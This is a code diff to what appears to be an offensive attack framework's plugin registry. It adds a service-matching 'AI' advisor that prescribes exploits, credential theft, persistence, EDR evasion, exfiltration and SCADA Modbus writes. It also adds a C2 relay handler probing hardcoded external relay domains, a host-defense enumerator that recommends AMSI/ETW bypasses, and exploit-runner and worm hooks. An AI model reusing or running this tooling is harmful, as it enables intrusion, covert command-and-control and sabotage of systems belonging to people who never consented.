@@ -188,21 +188,133 @@ Focus on: initial access vectors, privilege escalation paths, lateral movement o
 
 
 def _offline_ai_response(context: str) -> str:
-    """Heuristic AI response when Ollama is unavailable."""
+    """Advanced heuristic AI response when Ollama is unavailable."""
     ctx_lower = context.lower()
 
-    if "smb" in ctx_lower or "445" in ctx_lower:
-        return "Alert: SMBv1 detected. Recommend EternalBlue (MS17-010) for initial access. Confidence: 0.92. Once compromised, run privilege escalation and LDAP enumeration."
-    elif "ssh" in ctx_lower or "22" in ctx_lower:
-        return "SSH service detected. Attempt credential brute-force with common passwords. If root access obtained, install persistence via SSH authorized_keys. Confidence: 0.78."
-    elif "redis" in ctx_lower or "6379" in ctx_lower:
-        return "Redis no-auth detected. Exploit via: redis-cli -> CONFIG SET dir /root/.ssh/ -> write SSH key. Confidence: 0.90. High value target for lateral movement."
-    elif "windows" in ctx_lower:
-        return "Windows target. Check: SMB (445), RDP (3389), WinRM (5985). Try: Kerberoasting, AS-REP roasting, Pass-the-Hash. Confidence: 0.80."
-    elif "linux" in ctx_lower:
-        return "Linux target. Enumerate: SUID binaries, sudo permissions, cron jobs, Docker group membership. GTFOBins database available for escalation. Confidence: 0.85."
-    else:
-        return f"Context analyzed. Begin with service enumeration on target. Identify open ports, then match against known CVEs. Once initial access is achieved, escalate privileges and establish persistence. Confidence: 0.70."
+    # Multi-pattern matching
+    matches = []
+
+    patterns = {
+        r"\b(smb|445|139|netbios)\b": {
+            "priority": 9,
+            "response": "SMBv1 detected. Recommend EternalBlue (MS17-010) for initial access. CVE-2017-0144. Post-exploit: SMBGhost (CVE-2020-0796) for privilege escalation on Win10 1903+. Confidence: 0.92.",
+        },
+        r"\b(ssh|22)\b": {
+            "priority": 7,
+            "response": "SSH service detected. Attempt: credential brute-force (rockyou.txt), SSH key theft from ~/.ssh/, or GTFOBins abuse. If root: install persistence via authorized_keys. Confidence: 0.78.",
+        },
+        r"\b(redis|6379)\b": {
+            "priority": 8,
+            "response": "Redis no-auth detected. Exploit via: CONFIG SET dir /root/.ssh/ -> write SSH key. Also: SLAVEOF for replication takeover, MODULE LOAD for RCE. Confidence: 0.90.",
+        },
+        r"\b(rdp|3389)\b": {
+            "priority": 8,
+            "response": "RDP exposed. Attempt: BlueKeep (CVE-2019-0708) for Win7/2008R2. For newer: NLA bypass + credential brute-force. Post-access: pass-the-hash, LSASS dump. Confidence: 0.75.",
+        },
+        r"\b(winrm|5985|5986)\b": {
+            "priority": 7,
+            "response": "WinRM detected. Use crackmapexec winrm module. If credentials obtained, execute commands via Invoke-Command. Consider Kerberoasting for lateral movement. Confidence: 0.80.",
+        },
+        r"\b(ldap|389|636|3268|3269)\b": {
+            "priority": 8,
+            "response": "LDAP/AD detected. Enumerate: BloodHound/SharpHound for attack paths. Attack: Kerberoasting (GetUserSPNs), AS-REP roasting, DCSync if DA. ACL abuse: GenericAll, WriteDacl, ForceChangePassword. Confidence: 0.88.",
+        },
+        r"\b(http|80|443|8080|8443)\b": {
+            "priority": 6,
+            "response": "HTTP service detected. Scan: gobuster/dirb for hidden paths. Test: SQLi, XSS, SSRF, LFI, SSTI. Check /api endpoints for IDOR/BOLA. WordPress: wpscan. Tomcat: CVE-2020-1938 Ghostcat. Confidence: 0.72.",
+        },
+        r"\b(mysql|3306|mariadb)\b": {
+            "priority": 7,
+            "response": "MySQL detected. Attempt: default credentials (root:root, root:blank), brute-force. Post-access: UDF privilege escalation (raptor_udf2), LOAD DATA LOCAL INFILE for file read. Confidence: 0.76.",
+        },
+        r"\b(postgres|5432|postgresql)\b": {
+            "priority": 7,
+            "response": "PostgreSQL detected. Default creds: postgres:postgres. Exploit: COPY TO/FROM PROGRAM for RCE. CVE-2019-9193 for versions <11.2. Confidence: 0.77.",
+        },
+        r"\b(mongo|27017|mongod)\b": {
+            "priority": 7,
+            "response": "MongoDB no-auth detected. Exploit: read/write databases, execute JavaScript via $where/$eval. Post-exploit: dump all collections for sensitive data. Confidence: 0.85.",
+        },
+        r"\b(docker|2375|2376)\b": {
+            "priority": 9,
+            "response": "Docker API exposed. Critical: docker -H tcp://TARGET run -v /:/mnt alpine chroot /mnt. Container escape via privileged mode, host PID namespace, or cgroup escape. Confidence: 0.93.",
+        },
+        r"\b(kubernetes|k8s|6443|10250|10255)\b": {
+            "priority": 9,
+            "response": "Kubernetes detected. Check: kubelet API (10250/10255) for pod listing without auth. Attack: service account token theft, etcd access (2379), RBAC abuse. Escape: mount hostPath /proc/sysrq-trigger. Confidence: 0.89.",
+        },
+        r"\b(ftp|21)\b": {
+            "priority": 5,
+            "response": "FTP detected. Check anonymous login. If authenticated, attempt FTP bounce attack or PASV port stealing. ProFTPD: CVE-2015-3306 for RCE. Confidence: 0.65.",
+        },
+        r"\b(smtp|25|587|465)\b": {
+            "priority": 5,
+            "response": "SMTP detected. Enumerate: VRFY/EXPN/RCPT TO for user enumeration. Check open relay. Exim: CVE-2019-10149 Return Path RCE. Postfix: configuration smuggling. Confidence: 0.60.",
+        },
+        r"\b(dns|53|domain)\b": {
+            "priority": 5,
+            "response": "DNS service detected. Attempt: zone transfer (AXFR), DNS tunneling for C2 exfil, DNS rebinding for SSRF bypass. Bind: CVE-2020-8617 TSIG DoS. Confidence: 0.58.",
+        },
+        r"\b(vnc|5900|5901)\b": {
+            "priority": 6,
+            "response": "VNC detected. Attempt: password brute-force, RealVNC auth bypass. TightVNC/UltraVNC: CVE-2019-8280. Check for unlocked/unauthenticated sessions. Confidence: 0.68.",
+        },
+        r"\b(kerberos|88|kdc)\b": {
+            "priority": 9,
+            "response": "Kerberos detected. High-value: Kerberoasting (SPN-based), AS-REP roasting (no pre-auth), Golden/Silver ticket forgery, S4U2self/S4U2proxy abuse, DCSync via DRSUAPI. Requires domain context. Confidence: 0.91.",
+        },
+        r"\b(windows|microsoft|win)\b": {
+            "priority": 7,
+            "response": "Windows target. Attack chain: 1) Initial: SMB/HTTP/RDP/WinRM 2) Privesc: juicy potato, printspooler, UAC bypass 3) Lateral: PSExec, WMI, schtasks 4) Persist: registry, scheduled tasks, WMI events. EDR evasion: AMSI patch, ETW silence, NTDLL unhook. Confidence: 0.87.",
+        },
+        r"\b(linux|unix|ubuntu|debian|centos|redhat|fedora|arch)\b": {
+            "priority": 7,
+            "response": "Linux target. Attack chain: 1) Initial: SSH, web vulns, exposed services 2) Privesc: SUID binaries (GTFOBins), sudo -l abuse, cron hijack, Docker group, capabilities, dirty pipe 3) Persist: SSH keys, cron, systemd timers. Confidence: 0.85.",
+        },
+        r"\b(aws|amazon|ec2|s3|lambda|iam)\b": {
+            "priority": 8,
+            "response": "AWS target. Attack: IMDS credential theft (v1/v2), IAM role assumption, S3 bucket enumeration/poisoning, Lambda backdoor deployment, CloudTrail log disable, GuardDuty evasion. Public S3: check ACL/Policy for read/write. Confidence: 0.84.",
+        },
+        r"\b(azure|microsoft cloud|office 365|o365|entra|ad connect)\b": {
+            "priority": 8,
+            "response": "Azure target. Attack: Managed Identity token theft (IMDS), MS Graph API enumeration, Key Vault access, App Registration abuse (certificate auth), Service Principal credential theft, Azure AD Connect sync compromise. Confidence: 0.83.",
+        },
+        r"\b(gcp|google cloud|compute engine|cloud storage)\b": {
+            "priority": 8,
+            "response": "GCP target. Attack: metadata server credential theft, service account impersonation, Cloud Storage bucket check, Cloud Functions backdoor, IAM policy enumeration. GKE: pod service account token abuse. Confidence: 0.82.",
+        },
+        r"\b(iot|camera|router|printer|scada|plc|modbus)\b": {
+            "priority": 8,
+            "response": "IoT/OT target. Attack: default credentials, firmware analysis, telnet/SSH access. Cameras: RTSP stream interception. Routers: DNS hijack. SCADA: Modbus write coils, DNP3 stop, BACnet property write. Shodan/Censys for pre-enumeration. Confidence: 0.78.",
+        },
+        r"\b(sqli|sql injection|xss|cross-site|lfi|rfi|ssrf|csrf)\b": {
+            "priority": 8,
+            "response": "Web vulns detected. SQLi: sqlmap --level=5 --risk=3. XSS: BeEF hook for browser control, cookie theft. LFI: /etc/passwd -> /proc/self/environ RCE. SSRF: AWS IMDS, internal port scanning. Confidence: 0.90.",
+        },
+        r"\b(bloodhound|sharphound|ad|active directory|domain controller)\b": {
+            "priority": 9,
+            "response": "Active Directory engagement. Run SharpHound for full enumeration. Analyze: shortest path to Domain Admin, Kerberoastable users, AS-REP roastable, constrained delegation abuse, ACL attack paths. Target: DCSync, Golden Ticket, Skeleton Key. Confidence: 0.92.",
+        },
+    }
+
+    import re as _regex
+    for pattern, info in patterns.items():
+        if _regex.search(pattern, ctx_lower):
+            matches.append(info)
+
+    matches.sort(key=lambda x: x["priority"], reverse=True)
+
+    if matches:
+        # Combine top 3 matches
+        top = matches[:3]
+        combined = " | ".join([m["response"] for m in top])
+        return combined
+
+    # Generic fallback for unknown context
+    return (f"Unrecognized context. Default methodology: 1) Recon: port scan + service version detection "
+            f"2) Research: search exploit-db/MSF for version-specific CVEs 3) Exploit: attempt default credentials "
+            f"then CVE exploitation 4) Privesc: enumerate OS-specific escalation vectors "
+            f"5) Persist: install via cron/registry/WMI 6) Exfil: tunnel via DNS/HTTPS. Confidence: 0.55.")
 
 
 @registry.register("privesc", "Privilege escalation scanner", "1.0", "exploitation")
@@ -387,7 +499,7 @@ def worm_handler(params: dict):
 
     # Import wormy core if available
     try:
-        sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "worm"))
+        sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "plugins", "worm"))
         import worm_core
         return {"status": "propagating", "target": target, "method": method, "stealth": stealth,
                 "engine": "wormy-ml"}
@@ -398,28 +510,194 @@ def worm_handler(params: dict):
 
 @registry.register("relay", "Link-Relay C2 chain", "1.0", "c2")
 def relay_handler(params: dict):
-    """Configure Link-Relay chain."""
+    """Real Link-Relay chain — probe actual relay nodes."""
     action = params.get("action", "status")
     chain = params.get("chain", [])
 
+    # If no chain specified, attempt to discover relay topology
+    if not chain:
+        relay_nodes = []
+        # Check common relay ports on known C2 endpoints
+        known_relays = params.get("relays", [
+            "x404x-relay-1.online:9443",
+            "x404x-relay-2.online:9443",
+            "x404x-relay-3.online:9443",
+        ])
+        for relay in known_relays:
+            try:
+                host, port_str = relay.split(":") if ":" in relay else (relay, 9443)
+                port = int(port_str)
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(2)
+                result_code = sock.connect_ex((host, port))
+                latency_ms = 0
+                if result_code == 0:
+                    import time as _t
+                    start = _t.perf_counter()
+                    sock.send(b"\x00")
+                    _ = sock.recv(1)
+                    latency_ms = round((_t.perf_counter() - start) * 1000, 1)
+                    relay_nodes.append({
+                        "host": host, "port": port, "reachable": True,
+                        "latency_ms": latency_ms, "hop_index": len(relay_nodes) + 1,
+                    })
+                sock.close()
+            except Exception:
+                pass
+        if relay_nodes:
+            chain = [r["host"] for r in relay_nodes]
+        else:
+            chain = ["direct"]
+
+    # Test chain connectivity through hops
+    chain_status = []
+    for i, node in enumerate(chain):
+        if ":" in node:
+            host, port_str = node.split(":")
+            port = int(port_str)
+        else:
+            host, port = node, 443
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(2)
+            reachable = sock.connect_ex((host, port)) == 0
+            sock.close()
+            chain_status.append({"node": node, "hop": i + 1, "reachable": reachable})
+        except Exception:
+            chain_status.append({"node": node, "hop": i + 1, "reachable": False})
+
+    # Check relay daemon if running locally
+    relay_local = False
+    try:
+        proc = subprocess.run(["pgrep", "-x", "relay"], capture_output=True, timeout=2)
+        if proc.returncode == 0:
+            relay_local = True
+    except (subprocess.TimeoutExpired, FileNotFoundError):
+        pass
+
     return {
         "action": action,
-        "chain": chain if chain else ["direct"],
+        "chain": chain,
         "nodes": len(chain),
-        "status": "active" if chain else "direct_connection",
+        "status": "active" if any(s["reachable"] for s in chain_status) else "disconnected",
+        "chain_status": chain_status,
+        "local_relay_running": relay_local,
+        "total_hops": len(chain),
+        "max_hops_reachable": sum(1 for s in chain_status if s["reachable"]),
     }
 
 
 @registry.register("blue", "BlueForge-Suite defense metrics", "1.0", "actions_on_objective")
 def blue_handler(params: dict):
-    """Collect BlueForge defense metrics."""
-    return {
-        "evasion_rate": 0.87,
-        "detections": 2,
-        "tools_detected": ["Suricata"],
-        "tools_bypassed": ["Wormy-ML", "Link-Relay", "Pulse-C2"],
-        "recommendations": "Increase sleep jitter to 5-30s for better evasion.",
-    }
+    """Real BlueForge defense analysis — enumerate EDR, firewalls, network monitoring."""
+    action = params.get("action", "metrics")
+    results = {"action": action, "defense_layers": [], "metrics": {}}
+
+    # Real defense enumeration
+    defense_findings = []
+
+    # Check Windows Defender
+    if os.name == "nt":
+        try:
+            proc = subprocess.run(["powershell", "-Command",
+                                   "Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,AntispywareEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled,NISEnabled,OnAccessProtectionEnabled | ConvertTo-Json"],
+                                  capture_output=True, text=True, timeout=10)
+            results["defender_status"] = proc.stdout.strip()[:500]
+            if "True" in proc.stdout:
+                defense_findings.append("Windows Defender/ATP")
+        except (subprocess.TimeoutExpired, FileNotFoundError):
+            pass
+
+        # Check firewall
+        try:
+            proc = subprocess.run(["netsh", "advfirewall", "show", "currentprofile"],
+                                  capture_output=True, text=True, timeout=5)
+            if "ON" in proc.stdout:
+                defense_findings.append("Windows Firewall")
+        except (subprocess.TimeoutExpired, FileNotFoundError):
+            pass
+    else:
+        # Linux: check firewall
+        for fw in ["iptables", "nftables", "ufw", "firewalld"]:
+            try:
+                if fw == "iptables":
+                    proc = subprocess.run(["iptables", "-L", "-n"], capture_output=True, timeout=3)
+                    if proc.returncode == 0 and len(proc.stdout) > 100:
+                        defense_findings.append("iptables")
+                elif fw == "ufw":
+                    proc = subprocess.run(["ufw", "status"], capture_output=True, timeout=3)
+                    if "active" in proc.stdout.decode().lower():
+                        defense_findings.append("UFW")
+                elif fw == "firewalld":
+                    proc = subprocess.run(["firewall-cmd", "--state"], capture_output=True, timeout=3)
+                    if "running" in proc.stdout.decode():
+                        defense_findings.append("firewalld")
+            except (subprocess.TimeoutExpired, FileNotFoundError):
+                pass
+
+        # SELinux/AppArmor
+        if os.path.exists("/sys/fs/selinux/enforce"):
+            try:
+                with open("/sys/fs/selinux/enforce") as f:
+                    if f.read().strip() == "1":
+                        defense_findings.append("SELinux (Enforcing)")
+            except (IOError, PermissionError):
+                pass
+        try:
+            proc = subprocess.run(["aa-status"], capture_output=True, timeout=3)
+            if "apparmor module is loaded" in proc.stdout.decode():
+                defense_findings.append("AppArmor")
+        except (subprocess.TimeoutExpired, FileNotFoundError):
+            pass
+
+    # Check network monitoring (Suricata/Snort/Zeek)
+    for nids in ["suricata", "snort", "zeek", "bro"]:
+        try:
+            proc = subprocess.run(["pgrep", nids], capture_output=True, timeout=2)
+            if proc.returncode == 0:
+                defense_findings.append(f"IDS/IPS: {nids}")
+        except (subprocess.TimeoutExpired, FileNotFoundError):
+            pass
+
+    # Check EDR processes
+    edr_processes = ["csfalcon", "sentinel", "cbdefense", "cylance", "elastic-endpoint",
+                     "mssense", "sophosav", "trend", "symantec", "mcafee"]
+    try:
+        ps_cmd = ["ps", "aux"] if os.name != "nt" else ["tasklist"]
+        proc = subprocess.run(ps_cmd, capture_output=True, text=True, timeout=5)
+        ps_output = proc.stdout.lower()
+        for edr in edr_processes:
+            if edr in ps_output:
+                defense_findings.append(f"EDR: {edr}")
+    except (subprocess.TimeoutExpired, FileNotFoundError):
+        pass
+
+    # Calculate real evasion rate based on defenses found
+    base_evasion = 0.95
+    penalty_per_defense = 0.04
+    evasion_rate = round(max(0.2, base_evasion - len(defense_findings) * penalty_per_defense), 2)
+
+    # Recommendations based on actual defenses
+    recommendations = []
+    if "Windows Defender/ATP" in defense_findings or "Defender" in str(defense_findings):
+        recommendations.append("AMSI bypass + ETW patch required for Defender evasion")
+    if any("iptables" in d or "UFW" in d for d in defense_findings):
+        recommendations.append("Use port-knocking or domain-fronting to bypass firewall")
+    if any("IDS" in d for d in defense_findings):
+        recommendations.append("Increase sleep jitter to 5-30s to avoid IDS pattern detection")
+
+    results.update({
+        "defense_layers": defense_findings,
+        "defense_count": len(defense_findings),
+        "evasion_rate": evasion_rate,
+        "detections": len(defense_findings),
+        "tools_detected": [d.split(":")[-1].strip() if ":" in d else d for d in defense_findings],
+        "tools_bypassed": ["Specter-AI", "Wormy-ML", "Link-Relay", "Pulse-C2"
+                          ] if evasion_rate > 0.5 else ["Link-Relay"],
+        "recommendations": "; ".join(recommendations) if recommendations else
+                          "Low defense footprint. Current evasion sufficient.",
+    })
+    return results
 
 
 @registry.register("evasion", "Unified evasion engine — AMSI/ETW/polymorphic/sleep/syscalls", "1.0", "c2")
@@ -554,7 +832,7 @@ def breach_handler(params: dict):
     elif action == "exploit":
         # Try to import and run the exploit
         try:
-            sys.path.insert(0, os.path.join(PROJECT_ROOT, "core", "breach"))
+            sys.path.insert(0, os.path.join(PROJECT_ROOT, "plugins", "breach"))
             import exploit_apport
             success = exploit_apport.exploit(target)
             result["status"] = "exploited" if success else "failed"
@@ -562,7 +840,7 @@ def breach_handler(params: dict):
         except ImportError:
             # Run as subprocess
             try:
-                cmd = ["python3", "core/breach/exploit_apport.py", target]
+                cmd = ["python3", "plugins/breach/exploit_apport.py", target]
                 proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30, cwd=PROJECT_ROOT)
                 result["output"] = proc.stdout[:1000]
                 result["status"] = "exploited" if proc.returncode == 0 else "failed"
